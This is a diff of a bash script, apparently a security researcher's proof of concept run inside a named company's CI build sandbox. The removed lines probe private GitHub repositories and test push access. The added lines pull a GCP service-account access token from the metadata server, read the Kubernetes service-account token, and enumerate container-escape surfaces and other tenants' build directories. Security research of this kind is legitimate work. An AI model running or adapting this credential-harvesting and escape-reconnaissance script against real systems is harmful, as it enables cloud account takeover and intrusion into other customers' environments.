@@ -1,36 +1,59 @@
 #!/usr/bin/env bash
-# Yext CI credential IMPACT demonstration. Non-destructive:
-#  - ls-remote  = read probe, returns ref names only, no source cloned
-#  - push --dry-run = write-permission probe; GitHub authorizes git-receive-pack before any
-#    object transfer, so this reveals permission WITHOUT creating or changing any ref
+# Escape-surface + credential enumeration inside the Yext section-library build sandbox.
+# READ-ONLY. Enumerates only. Does NOT attempt an escape, does not write to cgroup/
+# core_pattern/docker.sock, does not touch other tenants' data.
 set +e
 B="YEXTPOC7731"
 echo "$B-BEGIN"
 
-echo "$B === IDENTITY ==="
-id 2>&1
-ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=15 -T git@github.com 2>&1
-ssh-add -l 2>&1
+echo "$B === A. WHO/WHERE ==="
+id; hostname; uname -a; cat /etc/os-release 2>/dev/null | head -3
 
-echo "$B === READ PROBE: private Yext repos (refs only, nothing cloned) ==="
-for R in yext/yext yext/sites yext/pages yext/visual-editor yext/yextve \
-         yext/pages-visual-editor-starter yext/sites-starter yext/deps; do
-  printf '%-42s ' "$R"
-  OUT=$(GIT_SSH_COMMAND='ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=15' \
-        git ls-remote "git@github.com:$R.git" 2>&1 | head -2 | tr '\n' ' ')
-  echo "$OUT"
+echo "$B === B. GCP METADATA SERVER (highest value) ==="
+MD=http://169.254.169.254/computeMetadata/v1
+H='Metadata-Flavor: Google'
+for P in "" "/project/project-id" "/instance/zone" "/instance/name" \
+         "/instance/service-accounts/" "/instance/service-accounts/default/email" \
+         "/instance/service-accounts/default/scopes"; do
+  printf 'md%-48s ' "$P"
+  curl -s -m 6 -H "$H" "$MD$P" 2>&1 | head -c 300; echo
 done
+echo "--- access token ---"
+curl -s -m 8 -H "$H" "$MD/instance/service-accounts/default/token" 2>&1 | head -c 600; echo
 
-echo "$B === WRITE PROBE: section-library supply chain (DRY RUN, nothing is written) ==="
-export GIT_SSH_COMMAND='ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=15'
-for R in yext-section-libraries/standard-library yext-section-libraries/bar-social-dining; do
-  echo "--- $R ---"
-  rm -rf /tmp/wt && git clone -q --depth 1 "git@github.com:$R.git" /tmp/wt 2>&1 | head -2
-  if [ -d /tmp/wt ]; then
-    ( cd /tmp/wt && git push --dry-run origin HEAD:refs/heads/poc7731-writetest 2>&1 | head -6 )
-  fi
-  rm -rf /tmp/wt
+echo "$B === C. KUBERNETES SERVICE ACCOUNT ==="
+ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1
+cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 | head -c 400
+env | grep -i kubernetes 2>&1
+
+echo "$B === D. CAPABILITIES / PRIVILEGE ==="
+grep -E 'CapEff|CapPrm|CapBnd|NoNewPrivs|Seccomp' /proc/self/status 2>&1
+capsh --print 2>&1 | head -6
+cat /proc/1/cgroup 2>&1 | head -5
+cat /proc/self/cgroup 2>&1 | head -5
+
+echo "$B === E. ESCAPE SURFACE (enumerate only, nothing written) ==="
+for F in /var/run/docker.sock /run/docker.sock /var/run/containerd/containerd.sock \
+         /run/buildkit/buildkitd.sock /sys/fs/cgroup/release_agent \
+         /proc/sys/kernel/core_pattern /dev/kmsg /dev/mem; do
+  printf '%-46s ' "$F"
+  if [ -e "$F" ]; then
+    printf 'EXISTS '; [ -r "$F" ] && printf 'readable '; [ -w "$F" ] && printf 'WRITABLE '
+    echo
+  else echo "absent"; fi
 done
+echo "--- non-overlay mounts (host passthrough?) ---"
+mount 2>&1 | grep -vE 'overlay|proc|sysfs|tmpfs|devpts|mqueue|cgroup' | head -20
+echo "--- block devices ---"
+ls -la /dev/ 2>&1 | grep -E 'sd|nvme|vd|dm-' | head
+
+echo "$B === F. SHARED BUILD CACHE / OTHER TENANTS ==="
+for D in /var/lib/buildkit /var/lib/docker /opt/buildhome/.npm /tmp /home; do
+  printf '%-28s ' "$D"; ls -la "$D" 2>&1 | head -4 | tr '\n' ' '; echo
+done
+echo "--- anything readable naming another account? ---"
+ls -la /opt/buildhome/ 2>&1
 
 echo "$B-END"
 exit 0
